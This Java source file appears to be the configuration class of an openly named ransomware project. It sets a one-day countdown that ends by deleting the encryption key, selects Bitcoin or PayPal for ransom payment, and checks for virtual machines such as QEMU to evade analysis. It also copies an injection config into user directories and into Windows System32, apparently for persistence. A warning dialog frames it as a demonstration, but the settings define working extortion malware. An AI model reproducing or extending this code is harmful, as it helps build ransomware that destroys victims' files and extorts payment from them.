package com.bechris100.open_ransomware;

import com.bechris100.open_ransomware.utils.RuntimeEnvironment;

import java.util.ArrayList;
import java.util.List;

public class SoftwareEnvironment {

    public static boolean osValueModificationsEnabled = true;

    public enum PreferredOperatingSystem {
        ANY,
        WINDOWS,
        LINUX
    }

    public static PreferredOperatingSystem preferredOs = PreferredOperatingSystem.ANY;

    public static boolean globalInjection = false;
    public static boolean virtualMachineCheck = false;
    public static String javaVmOsNameModified = "The Name of your current running Operating System cannot be modified for this configuration.";
    public static String javaVmOsArchModified = "The Architecture of your current running Operating System and/or Hardware cannot be modified for this configuration.";
    public static String javaVmOsVersionModified = "The Version of your current running Operating System cannot be modified for this configuration.";

    public static String messageFile = "res/message.txt";

    public static class Timeout {

        public static int timeoutDays = 1;
        public static int timeoutHours = 0;
        public static int timeoutMinutes = 0;
        public static int timeoutSeconds = 0;
        // this practically uses for the whole countdown stuff.
        public static int timeoutMilliseconds = 0;

        public static String action = "DELETE_ENCRYPTION_KEY";

    }

    public static class UserPrompt {

        public static boolean enabled = true;

        public static String title = "Ransomware User Prompt";
        public static String message =
                "<html><body>Ransomware including any Trojans can be dangerous.</br>Do not execute anything that you do not trust.</br>Continue?</body></html>";

    }

    public static class Billing {

        public enum BillingType {
            BITCOIN,
            PAYPAL
        }

        public static BillingType preferredBilling = BillingType.BITCOIN;

    }

    public static class ConfigCopyOut {

        public static boolean enabled = false;

        public static String outLinux = RuntimeEnvironment.USER_HOME.getPath() + "/.config/OpenSoftware/BeChris100/open-ransomware/inject.cfg";
        public static String outLinuxGlobal = RuntimeEnvironment.USER_HOME.getPath() + "/.config/OpenSoftware/BeChris100/open-ransomware/inject.cfg";
        public static String outWindows = RuntimeEnvironment.USER_HOME.getPath() + "\\AppData\\Roaming\\OpenSoftware\\BeChris100\\open-ransomware\\inject.cfg";
        public static String outWindowsGlobal = System.getenv("windir") + "\\System32\\OpenSoftware\\BeChris100\\open-ransomware\\inject.cfg";

    }

    public static List<String> getVmCheckers() {
        List<String> list = new ArrayList<>();
        list.add("qemu");

        return list;
    }

}
